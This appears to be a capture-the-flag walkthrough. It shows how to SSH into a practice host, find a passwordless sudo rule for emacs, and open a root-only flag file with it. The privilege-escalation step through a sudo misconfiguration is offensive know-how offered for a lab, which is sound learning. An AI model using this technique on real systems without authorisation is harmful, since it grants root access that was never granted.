Step 1 — Connect to the remote machine

Use SSH with the provided port.

ssh -p 59182 ctf-player@green-hill.picoctf.net

Type yes when asked about the fingerprint.

Then enter the password provided in the challenge.

After login you will see:

ctf-player@challenge:~$
Step 2 — Check sudo permissions

Run the following command to see what commands you can execute as root.

sudo -l

Output:

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs

This means:

The user ctf-player can run emacs as root

No password required

This is a privilege escalation opportunity.

Step 3 — Look for the flag

List the files in the current directory.

ls -la

Output shows:

-r--r----- 1 root root 31 Mar 6 20:18 flag.txt

Important points:

File owner: root

Permissions: readable only by root

So the normal user cannot read the file.

Step 4 — Use sudo with emacs to read the file

Since we can run emacs as root, open the flag file with it.

sudo emacs flag.txt

Because emacs runs as root, it can read the file.

The flag will appear inside the emacs editor window.

Step 5 — Copy the flag

Inside emacs you will see the flag.
